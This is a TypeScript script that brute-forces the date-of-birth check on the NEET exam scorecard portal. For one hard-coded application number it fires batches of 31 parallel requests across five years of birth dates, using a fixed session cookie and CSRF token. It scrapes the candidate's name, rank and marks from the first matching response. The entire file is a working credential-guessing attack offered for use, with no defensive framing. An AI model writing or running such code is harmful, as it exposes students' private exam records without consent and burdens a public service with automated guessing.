import axios from 'axios'
import qs from 'qs'
import cheerio from 'cheerio'
import { data } from 'cheerio/lib/api/attributes';

async function solve(applicationNumber: string, day: string, month: string, year: string) {
    let data = qs.stringify({
        '_csrf-frontend': 'iaVB23eQzaTp3tatIMuz9Xx5GJkfPeZyndXHDvsoXtLP_XGiJtScyZ-aheh1hICqLExU4FgKoh_apbJqqmkJlg==',
        'Scorecardmodel[ApplicationNumber]': applicationNumber,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'advanced-frontend=7h2u3tkaqii2peb7ft3d3dou6q; _csrf-frontend=07c1b2872401cc2fb91aa269c9144725033402dadbe8590e06bbb834048bfd67a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22FX0yQDQmvDSEUO3_P5LyG7DmGpudQAWD%22%3B%7D',
            'Origin': 'null',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
        },
        data: data
    };


    const response = await axios.request(config)
    const parseData = parseHtml(JSON.stringify(response.data))


    return parseData;



    // .then((response) => {
    //     console.log(JSON.stringify(response.data));
    // })
    // .catch((error) => {
    //     console.log(error);
    // });

}

function parseHtml(htmlContent: string) {
    const $ = cheerio.load(htmlContent);

    const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';
    const candidateName = $('td:contains("Candidate’s Name")').next('td').text().trim() || 'N/A';
    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';

    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';

    // console.log({
    //     applicationNumber,
    //     candidateName,
    //     allIndiaRank,
    //     marks
    // });

    if (allIndiaRank === 'N/A') {
        return null;
    }

    return {
        applicationNumber,
        candidateName,
        allIndiaRank,
        marks

    }

}

async function main(rollNumber: string) {
    for (let year = 2007; year > 2002; year--) {
        for (let month = 1; month <= 12; month++) {
            const dataPromises = [];
            console.log("Sending requests for month " + month + "of the year " + year);
            
            for (let day = 1; day <= 31; day++) {
                //console.log(`Processing ${rollNumber} for ${day}-${month}-${year}`);
                
                const dataPromise = solve(rollNumber, day.toString(), month.toString(), year.toString());
                dataPromises.push(dataPromise);
            }
            // wait for all 31 req
           const resolvedData =  await Promise.all(dataPromises);
           resolvedData.forEach((data) => {
                if (data) {
                    console.log(data);
                    process.exit(1);
                }
           })
        }
    }
}

main("240411183516");

